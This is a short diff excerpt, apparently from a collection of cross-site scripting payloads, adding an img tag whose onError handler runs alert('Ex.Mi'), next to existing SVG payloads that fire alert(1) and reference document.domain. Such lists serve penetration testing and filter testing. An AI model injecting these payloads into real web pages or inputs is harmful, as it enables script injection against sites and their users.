@@ -28,3 +28,5 @@ ${document.domain}`%26it;/script>'>
 </svg>
 
 <svg><animate onbegin=evt.path.pop().alert(1) attributeName=x dur=1s>
+
+<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
